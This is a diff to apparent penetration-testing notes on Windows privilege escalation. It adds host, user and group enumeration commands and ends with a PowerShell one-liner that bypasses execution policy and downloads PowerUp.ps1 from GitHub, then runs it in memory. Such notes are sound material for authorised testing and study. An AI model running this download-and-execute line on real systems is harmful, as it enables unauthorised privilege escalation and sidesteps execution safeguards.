@@ -1,3 +1,5 @@
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md
+
 # Network Information
 ```powershell
 ipconfig /all
@@ -29,3 +31,59 @@ $policy.AppLockerPolicy.RuleCollection | ForEach-Object {
     }
 } | Format-Table -AutoSize
 ```
+
+# System Information
+```powershell
+tasklist /svc
+
+# Show Environment
+set
+
+# System Information
+systeminfo
+
+# Kernel Update
+wmic qfe
+Get-HotFix | ft -AutoSize
+
+# Installed Programs
+wmic product get name
+Get-WmiObject -Class Win32_Product |  select Name, Version
+
+# Display Running Process
+netstat -ano
+```
+
+# User and Groups
+```powershell
+# User and Groups Enumeration
+query user
+net user
+net localgroup
+
+# Current User
+echo %USERNAME%
+
+# Current User privileged
+whoami /priv
+
+# Group Enumeration
+whoami /groups
+net localgroup
+
+# Group Membership
+net localgroup administrators
+```
+
+# Enumerate Policy
+```powershell
+net accounts
+```
+
+# PowerUp
+```powershell
+powershell -Version 2 -nop -exec bypass IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellEmpire/PowerTools/master/PowerUp/PowerUp.ps1'); Invoke-AllChecks
+
+
+```
+
